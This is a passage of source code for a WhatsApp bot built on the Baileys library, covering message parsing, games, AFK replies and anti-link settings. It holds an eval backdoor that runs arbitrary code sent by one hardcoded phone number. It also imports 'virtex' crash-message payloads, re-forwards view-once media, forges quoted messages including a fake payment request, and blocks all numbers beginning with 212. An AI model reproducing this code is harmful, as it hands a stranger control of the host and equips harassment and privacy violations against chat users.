require('./settings')
require('./lib/listmenu')
const { modul } = require('./module');
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture } = require('./lib/myfunc')
const { color, bgcolor } = require('./lib/color')
const { buttonkal } = require('./kbug/virtex/buttonkal')
const { rentfromxeon, conns } = require('./RentBot')
const { uptotelegra } = require('./scrape/upload')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./scrape/uploader')
const { dafontSearch, dafontDown } = require('./scrape/dafont')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess')
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const photooxy = require('./scrape/photooxy')
const { ios1 } = require('./kbug/virtex/ios1.js')
const { zetsubonotgay } = require('./kbug/virtex/zetsubonotgay.js')

const { ios2 } = require('./kbug/virtex/ios2.js')
const yts = require('./scrape/yt-search')
const kirleys = require('@adiwajshing/baileys')
const vm = require('node:vm')
const mark = `0@s.whatsapp.net`
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const xeonverifieduser = JSON.parse(fs.readFileSync('./database/user.json'))
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonvn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonsticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonimage.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonvideo.json'))
const BadXeon = JSON.parse(fs.readFileSync('./database/bad.json'))
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))

let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));

let tebaklagu = []
let _family100 = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

module.exports = Kyuu = async (Kyuu, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const gakbisaowner = `${ownernumber}@s.whatsapp.net`
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await Kyuu.decodeJid(Kyuu.user.id)
        const XeonTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const XeonTheDeveloper = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await Kyuu.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(m.sender)
    	const isContacts = contacts.includes(m.sender)
    	const isUser = xeonverifieduser.includes(sender)
    	const banUser = await Kyuu.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>');
    
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
    
        //TIME
        const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 

		if (isEval && senderNumber == "6285813708397") {
			let evaled,
				text = q,
				{ inspect } = require('util');
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					);
					m.reply(evaled);
				}
				evaled = await eval(text);
				if (typeof evaled !== 'string') evaled = inspect(evaled);
				await Kyuu.sendMessage(from, { text: evaled }, { quoted: m });
			} catch (e) {
				Kyuu.sendMessage(from, { text: String(e) }, { quoted: m });
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premium: false
}
} catch (err) {
console.error(err)
}

if (!Kyuu.public) {
if (!m.key.fromMe) return
}

    const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./database/register.js')
//chat counter (console log)
        if (m.message && m.isGroup) {
            Kyuu.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            Kyuu.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

if (isCmd && !isUser) {
xeonverifieduser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(xeonverifieduser, null, 2))
}

Kyuu.sendPresenceUpdate('available', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Don't Tag Him!
He's AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

//auto block pakistan number
if (m.sender.startsWith('212')) return Kyuu.updateBlockStatus(m.sender, 'block')

async function sendKyuuMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await Kyuu.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
//group chat msg  by Fxyz
const replygcxeon2 = (teks) => {
Kyuu.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})
}
const replygcxeon = (teks) => {        
sendKyuuMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
const reply = (teks) => {
Kyuu.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : m })
}

const sendSticker = (pesan) => {
Kyuu.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

try {
ppuser = await Kyuu.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
defaultpp = await reSize(ppuser, 300, 300)

const sendvn = (teks) => {
Kyuu.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

//

        const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        
//autoreply
        	const isRegistered = checkRegisteredUser(m.sender)
        //
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./XeonMedia/audio/${BhosdikaXeon}.mp3`)
Kyuu.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
Kyuu.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
Kyuu.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
Kyuu.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${m.sender.split("@")[0]}\n├ *Clock* : ${time2}\n└ *Message* : ${m.mtype}`
Kyuu.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m}).catch(_ => m.reply(`Maybe It's Opened`))
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }

const banRep = () => {
Kyuu.sendMessage(m.chat, {
text:`Sorry you've been banned, please chat @${creator.split("@")[0]} to unban`,
mentions: [creator],
},
{
quoted:m
})
}

//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

if (isCmd && isBanned) {
return banRep()
}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await Kyuu.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Kyuu.getName(i)}\nFN:${await Kyuu.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

if (('family100'+from in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+from]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
 let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
 if (room.terjawab[index]) return !0
 room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
Kyuu.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+from]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   Kyuu.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Kyuu.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
 delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Kyuu.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
 delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Kyuu.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Kyuu.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Kyuu.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Kyuu.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

function simpan(path, buff) {
    fs.writeFileSync(path, buff)
    return path
}
function getRandom(ext) {
    ext = ext || ""
    return `${Math.floor(Math.random() * 100000)}.${ext}`
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await Kyuu.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await Kyuu.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

const kalgans = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
